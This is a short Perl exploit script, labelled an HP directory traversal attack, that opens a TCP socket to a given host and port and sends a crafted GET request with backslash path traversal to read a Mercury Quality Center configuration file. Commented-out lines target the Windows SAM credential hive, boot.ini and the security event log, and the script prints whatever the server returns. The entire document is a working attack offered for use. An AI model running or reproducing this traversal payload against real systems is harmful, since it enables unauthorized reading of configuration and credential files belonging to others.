#!/usr/bin/perl
#########################
#
#########################

use IO::Socket;

print "[HP Directory Traversal Attack]\n";

my $IP = shift or &Usage;
my $Port = shift or &Usage;
## my $Payload = "A"x1024;

print "[+] Connecting to $IP on port $Port.\n";
my $Socket = new IO::Socket::INET (PeerAddr => "$IP", PeerPort => "$Port", Proto => "tcp") or die "Unable to connect.\n";
print "[+] Sending Payload...\n";
        #print $Socket "GET /..\\..\\..\\..\\..\\..\\..\\..\\boot.ini HTTP/1.1\r\n";
        #print $Socket "GET /..\\..\\..\\..\\..\\..\\..\\..\\WINDOWS\\SYSTEM32\\config\\SAM HTTP/1.1\r\n";
        #print $Socket "GET /..\\..\\..\\..\\..\\..\\..\\..\\WINDOWS\\SYSTEM32\\config\\SecEvent.evt HTTP/1.1\r\n";
        print $Socket "GET /..\\..\\..\\..\\..\\..\\..\\..\\Program%20Files\\Mercury\\Quality%20Center\\conf\\QCConfigFile.properties HTTP/1.1\r\n";
        print $Socket "Accept: */*\r\n";
        print $Socket "Host: $IP\r\n";
	print $Socket "\r\n\r\n";
        my @Response = <$Socket>;
	close $Socket;
	print "@Response\n";
exit 0;

sub Usage {
	print "Proper Usage:\n\t$0 [HOST/IP] [PORT]\n\n";
	exit 0;
}

